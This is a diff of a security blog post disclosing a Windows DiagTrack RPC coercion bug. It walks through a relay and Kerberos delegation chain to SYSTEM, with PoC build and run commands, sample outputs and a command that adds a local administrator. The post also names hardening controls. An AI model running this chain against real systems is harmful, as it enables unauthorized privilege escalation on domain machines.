@@ -62,91 +62,154 @@
         <strong>How to read this.</strong> Microsoft scored CVE-2026-69267 for its root cause: an unauthorized local caller reaching SYSTEM-context file-system access through the DiagTrack RPC method (information disclosure, CWE-1220). Everything below the coercion is what that primitive <em>enables</em> in a default Active Directory environment - the NTLM relay to <code>NT AUTHORITY\SYSTEM</code> - and it additionally depends on LDAP signing and channel binding not being enforced. That escalation chain is why the base score reflects disclosure rather than full EoP, and why any one of the LDAP-hardening controls below breaks it.
     </div>
 
-    <h2>// the one-line version</h2>
+    <h2>// the finding, in one paragraph</h2>
 
     <p>
-        The Windows <strong>Connected User Experiences and Telemetry</strong> service - <code>DiagTrack</code>, running as <code>NT AUTHORITY\SYSTEM</code> inside <code>svchost.exe -k utcsvc</code> - exposes an RPC method that takes a file path and accesses it <em>as SYSTEM with no check on the caller</em>. That unchecked SYSTEM-context access is the vulnerability Microsoft assigned the CVE to. Point the path at a WebDAV UNC and the SYSTEM context authenticates outbound with the machine account; relay that authentication to the domain controller, configure delegation against the machine's own AD object, and Kerberos hands you back an administrator. From a <strong>standard domain user with no admin rights</strong>, on localhost, in under 30 seconds.
+        The Windows <strong>Connected User Experiences and Telemetry</strong> service - <code>DiagTrack</code>, running as <code>NT AUTHORITY\SYSTEM</code> inside <code>svchost.exe -k utcsvc</code> - exposes an RPC method that takes a caller-supplied file path and accesses it <em>in the SYSTEM security context with no check on who is calling</em>. A standard, unprivileged local user can invoke it and make SYSTEM touch a path of their choosing. That is the whole vulnerability, and it is what Microsoft assigned the CVE to: information disclosure through insufficient granularity of access control (CWE-1220). Everything later in this post is what that single primitive lets you build on a default domain.
     </p>
 
-    <h2>// the vulnerable method</h2>
+    <h2>// finding it: hunting DiagTrack's RPC surface</h2>
 
     <p>
-        DiagTrack hosts an RPC interface with UUID <code>4c9dbf19-d39e-4bb9-90ee-8f7179b20283</code> (v1.0). <strong>Opnum 19</strong> accepts a file-path parameter and accesses the target path in the SYSTEM security context - without verifying that the caller is elevated, without impersonating the caller, without any access check at all. Any authenticated principal with an interactive logon can invoke it.
-    </p>
-
-    <p>
-        That single missing check is the vulnerability. Everything after it is well-known NTLM-coercion and Resource-Based Constrained Delegation (RBCD) abuse - the novelty is that this primitive lives on a previously unreported RPC interface, in the same family as <strong>PetitPotam</strong> (MS-EFSR) and <strong>PrinterBug</strong> (MS-RPRN).
-    </p>
-
-    <h2>// step 1 - coerce SYSTEM into authenticating</h2>
-
-    <p>
-        DiagTrack registers its LRPC endpoint <em>dynamically</em>; the ALPC port name changes on every restart. The PoC resolves it at runtime with <code>RpcEpResolveBinding</code> over <code>ncalrpc</code>, then speaks LRPC by hand - a 72-byte bind message naming the DiagTrack UUID and NDR transfer syntax, followed by an Opnum 19 request whose body is an NDR-marshaled conformant string (the path) plus an 8-byte-aligned integer, delivered via <code>NtAlpcConnectPort</code> / <code>NtAlpcSendWaitReceivePort</code>. No RPC runtime stubs, no special token.
+        DiagTrack is an attractive target before you know anything is wrong with it: it runs as SYSTEM, it is enabled by default on every Windows 10/11 SKU, and it exposes an ALPC (local RPC) surface that any logged-on user can reach. The question was simply <em>what can that surface be talked into doing</em>.
     </p>
 
     <p>
-        The path handed to Opnum 19 is a WebDAV UNC:
+        Enumerating the interfaces the service registers turns up one owned by <code>diagtrack.dll</code>:
+    </p>
+
+    <pre><code>Interface : 4c9dbf19-d39e-4bb9-90ee-8f7179b20283  v1.0
+  Binding : ncalrpc:[LRPC-9b6bdc1879c53e56a8]
+  Host    : svchost.exe (utcsvc)  ->  NT AUTHORITY\SYSTEM
+  Methods : 0 .. 27</code></pre>
+
+    <p>
+        Walking the methods, <strong>Opnum 19</strong> stands out: its signature takes a string that is treated as a <em>file path</em>. Watching the service with Process Monitor while calling it shows the payoff - the path is opened by the <strong>SYSTEM</strong> process, not by the caller:
+    </p>
+
+    <pre><code># calling Opnum 19 with path = C:\Windows\Temp\probe.txt, as a plain user
+
+Process   svchost.exe (utcsvc)   PID 2160
+Operation CreateFile
+Path      C:\Windows\Temp\probe.txt
+User      NT AUTHORITY\SYSTEM        &lt;-- accessed as SYSTEM, caller was CORP\jsmith
+Result    NAME NOT FOUND</code></pre>
+
+    <p>
+        There is no access check, no impersonation of the caller, no elevation requirement. A standard user just made SYSTEM perform file access on their behalf. Even the negative result (<code>NAME NOT FOUND</code> vs <code>ACCESS DENIED</code> vs <code>SUCCESS</code>) is an information-disclosure oracle: it reveals the existence and reachability of paths as SYSTEM. <strong>That is the CVE.</strong>
+    </p>
+
+    <div class="callout">
+        <strong>Why this is the interesting bug and not the Kerberos part.</strong> The delegation chain later in this post is textbook once you have a coercion primitive. The actual research was here: an unreported SYSTEM RPC method that dereferences an attacker-controlled path with no caller check. It is the same <em>class</em> as PetitPotam (MS-EFSR) and PrinterBug (MS-RPRN), but on a brand-new interface nobody had reported.
+    </div>
+
+    <h2>// turning a file read into authentication</h2>
+
+    <p>
+        "SYSTEM opens a path I control" becomes "SYSTEM authenticates to me" the moment the path is a remote one. The path handed to Opnum 19 is a <strong>WebDAV UNC</strong>:
     </p>
 
     <pre><code>\\127.0.0.1@&lt;PORT&gt;\DavWWWRoot\&lt;random&gt;.wprp</code></pre>
 
     <p>
-        The <code>server@port</code> syntax forces the <strong>WebClient</strong> service (WebDAV Mini-Redirector) - not the SMB client - to service it. WebClient issues an HTTP request to <code>127.0.0.1:&lt;PORT&gt;</code> and, when challenged, authenticates with NTLM using the <strong>machine account</strong>. Because DiagTrack runs as SYSTEM, that outbound auth carries the machine identity to a listener bound on loopback. Nothing crosses the network perimeter.
+        The <code>server@port</code> form forces the <strong>WebClient</strong> service (the WebDAV Mini-Redirector) - not the SMB client - to service it, so it works over a chosen TCP port on loopback. WebClient issues an HTTP request and, when challenged, authenticates with NTLM using the <strong>machine account</strong>. Because DiagTrack drives this as SYSTEM, that outbound authentication carries the machine identity straight to a listener on <code>127.0.0.1</code>. Nothing leaves the box.
     </p>
-
-    <h2>// step 2 - relay to LDAPS</h2>
 
     <p>
-        NTLM isn't channel-bound by default, so the challenge/response captured over HTTP is replayed over LDAP. The PoC runs an HTTP listener and an LDAPS client to the DC as a cross-protocol relay:
-    </p>
+        Reproducing the interface work by hand takes only two runtime pieces, both without linking the RPC stubs: resolve the (dynamic) endpoint with <code>RpcEpResolveBinding</code> over <code>ncalrpc</code>, then hand-build a 72-byte LRPC bind and an Opnum 19 request (an NDR conformant string plus an 8-byte-aligned integer) sent through <code>NtAlpcConnectPort</code> / <code>NtAlpcSendWaitReceivePort</code>. What lands on the loopback listener is the machine account authenticating as SYSTEM:</p>
 
-    <div class="diagram"><span class="hl">SYSTEM WebClient</span>  ->  attacker HTTP (127.0.0.1)     DC (LDAPS 636)
-      |                                             |
-      |  HTTP 401 WWW-Authenticate: NTLM            |
-      |  &lt;- NTLM Type 1 (Negotiate)                 |
-      |        wrap in SPNEGO LDAP Bind        ->    |  returns Type 2 (Challenge)
-      |  HTTP 401 WWW-Authenticate: NTLM &lt;Type2&gt;     |
-      |  &lt;- NTLM Type 3 (Authenticate)              |
-      |        wrap in SPNEGO LDAP Bind        ->    |  validates, bind completes
-      |  HTTP 200 OK                                |
-      v                                             v
-   released                          authenticated LDAP session as MACHINE$</div>
+    <pre><code>[listener 127.0.0.1:52341]  &lt;- GET /DavWWWRoot/8f2a...wprp
+                               User-Agent: Microsoft-WebDAV-MiniRedir/10.0
+[listener]  -> 401  WWW-Authenticate: NTLM
+[listener]  &lt;- NTLMSSP  Type 1  (Negotiate)   domain = CORP
+[listener]  -> 401  WWW-Authenticate: NTLM &lt;Type2&gt;
+[listener]  &lt;- NTLMSSP  Type 3  (Authenticate)  user = WKSTN01$   &lt;-- machine account, coerced from SYSTEM</code></pre>
 
     <p>
-        The machine hash never travels in clear, and default 120+ character machine passwords make cracking pointless. The value is the <strong>relay</strong>, not the hash - which is exactly why <strong>LDAP signing / channel binding are the killswitch</strong>: with either enforced, the relayed bind fails.
+        At this point the vulnerability is fully demonstrated: an unprivileged user coerced SYSTEM into authenticating. The rest is what you can do with a coerced machine credential on a default domain.
     </p>
 
-    <h2>// step 3 - configure RBCD</h2>
+    <h2>// what it enables: coercion to SYSTEM</h2>
 
     <p>
-        With an LDAP session as <code>MACHINE$</code>:
+        In a default Active Directory environment the coerced authentication is <em>relayed</em> to the domain controller and turned into a full local privilege escalation. This half is standard NTLM-relay + RBCD tradecraft, condensed here; it is also the part that <strong>any one</strong> of the hardening controls below shuts down.
     </p>
+
+    <div class="diagram"><span class="hl">unprivileged user</span>
+   |  (1) Opnum 19, WebDAV UNC
+   v
+<span class="hl">DiagTrack (SYSTEM)</span> -> WebClient -> NTLM as WKSTN01$  -> attacker listener (127.0.0.1)
+   |  (2) relay the NTLM into an LDAP bind
+   v
+<span class="hl">Domain Controller (LDAPS 636)</span>  -> authenticated LDAP session as WKSTN01$
+   |  (3) create computer obj + write RBCD on WKSTN01$ itself
+   |  (4) Kerberos S4U2Self + S4U2Proxy -> cifs/WKSTN01 as "Administrator"
+   v
+<span class="hl">SMB2 -> \pipe\svcctl -> CreateService -> StartService</span>  =>  NT AUTHORITY\SYSTEM</div>
+
+    <p>Each numbered stage, and the illustrative output a debug build emits:</p>
 
     <ol>
-        <li><strong>Create a computer object.</strong> <code>ms-DS-MachineAccountQuota</code> defaults to 10, so any authenticated principal can add one via LDAP Add (<code>userAccountControl = 4096</code>, an attacker-chosen <code>unicodePwd</code>, standard SPNs).</li>
-        <li><strong>Point the victim's delegation at it.</strong> LDAP Modify the victim's own object to set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to a security descriptor granting the new computer SID <code>GenericAll</code>. The machine account has write access to its own delegation attribute - so the relayed identity is sufficient.</li>
+        <li><strong>Relay to LDAPS.</strong> NTLM is not channel-bound by default, so the HTTP challenge/response is replayed inside an LDAP bind. The hash never travels in clear (and 120+ char machine passwords make cracking pointless) - the value is the relayed session, not the hash.
+        <pre><code>[ldap] bind as CORP\WKSTN01$ (relayed) ... OK</code></pre></li>
+        <li><strong>Configure RBCD.</strong> <code>ms-DS-MachineAccountQuota</code> defaults to 10, so add a computer object, then set <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> on the victim's <em>own</em> object to trust it. The machine account can write its own delegation attribute.
+        <pre><code>[ldap] add    CN=DESKTOP-A5F1CE,CN=Computers,DC=corp,DC=example,DC=com ... OK
+[ldap] modify WKSTN01$  msDS-AllowedToActOnBehalfOfOtherIdentity      ... OK</code></pre></li>
+        <li><strong>Kerberos S4U.</strong> AS-REQ as the new computer account, then S4U2Self + S4U2Proxy yield a <code>cifs/&lt;victim&gt;</code> ticket impersonating a domain admin.
+        <pre><code>[krb] AS-REQ    DESKTOP-A5F1CE$                 -> TGT
+[krb] S4U2Self  impersonate Administrator        -> ticket
+[krb] S4U2Proxy cifs/WKSTN01.corp.example.com    -> service ticket (Administrator)</code></pre></li>
+        <li><strong>SYSTEM via SMB2 + SCM.</strong> Use that ticket against the local machine over SMB2, open <code>\pipe\svcctl</code>, and create/start a service. Domain admins are local admins on domain members, so it runs as SYSTEM.
+        <pre><code>[smb2] SessionSetup (Kerberos AP-REQ) -> logged in as CORP\Administrator
+[scm]  CreateServiceW "WinDiagHost" -> StartServiceW -> running as SYSTEM</code></pre></li>
     </ol>
 
-    <h2>// step 4 - Kerberos S4U to an admin ticket</h2>
+    <h2>// running the poc</h2>
 
     <p>
-        The PoC implements Kerberos v5 from scratch (MD4, RC4, HMAC-MD5, ASN.1 DER):
+        The PoC is a single self-contained C# file (no third-party libraries; it implements MD4, RC4, HMAC-MD5/SHA256, ASN.1/DER, Kerberos, NTLM, LDAP, SMB2, DCE/RPC and LRPC from scratch). Build it with the in-box .NET compiler:
     </p>
 
-    <ol>
-        <li><strong>AS-REQ</strong> as the new computer account (RC4-HMAC) -> TGT.</li>
-        <li><strong>S4U2Self</strong> -> a ticket to the account itself impersonating <code>Administrator</code> (<code>PA-FOR-USER</code>, KerbChecksum, key usage 17).</li>
-        <li><strong>S4U2Proxy</strong> -> <code>cifs/&lt;victim-fqdn&gt;</code> using the S4U2Self ticket as the additional ticket (<code>PA-PAC-OPTIONS</code> RBCD flag, constrained-delegation KDC option).</li>
-    </ol>
+    <pre><code>%WINDIR%\Microsoft.NET\Framework64\v4.0.30319\csc.exe /nologo /out:dt.exe DiagTrackExploit.cs</code></pre>
 
     <p>
-        Result: a <code>cifs/&lt;victim&gt;</code> service ticket that impersonates a domain administrator.
+        Then run it from an <strong>interactive</strong> session of a standard domain user, passing the DC address. The clean build keeps stdout minimal - a header, a progress bar, and a SYSTEM shell:
     </p>
 
-    <h2>// step 5 - SYSTEM via SMB2 + SCM</h2>
+    <pre><code>C:\&gt; dt.exe 10.0.0.10
+
+  Host:  WKSTN01.corp.example.com
+  User:  CORP\jsmith
+  DC:    10.0.0.10
+
+  \ Working...
+  [####################] 100%
+
+  !!!! WE RULE THE SYSTEM !!!!
+
+SYSTEM@WKSTN01&gt; whoami
+nt authority\system
+SYSTEM@WKSTN01&gt; hostname
+WKSTN01
+SYSTEM@WKSTN01&gt; exit
+  Shell closed.</code></pre>
 
     <p>
-        That ticket is used against the local machine over SMB2 (SessionSetup via SPNEGO/AP-REQ, HMAC-SHA256 signing): TreeConnect to <code>IPC$</code>, open <code>\pipe\svcctl</code>, DCE/RPC bind to SCMR, then <code>OpenSCManagerW</code> -> <code>CreateServiceW</code> -> <code>StartServiceW</code>. Domain admins are local admins on domain members, so the SCM operations succeed - and the service starts as <strong>NT AUTHORITY\SYSTEM</strong>.
+        A single command instead of a shell:
+    </p>
+
+    <pre><code>C:\&gt; dt.exe 10.0.0.10 --exec "net localgroup administrators redroot /add"</code></pre>
+
+    <p>
+        If the environment is hardened, the failure is explicit and tells you which control stopped it - a relay/bind failure means LDAP signing or channel binding is enforced; a Kerberos failure usually means <code>MachineAccountQuota = 0</code>:
+    </p>
+
+    <pre><code>  !!!! Can't Get System !!!!
+
+  ERROR: LDAP bind failed (relay rejected)</code></pre>
+
+    <p>
+        Full build, run, options, cleanup and troubleshooting notes are in the repository's <code>REPRODUCE.md</code>.
     </p>
 
     <h2>// why it stays quiet</h2>
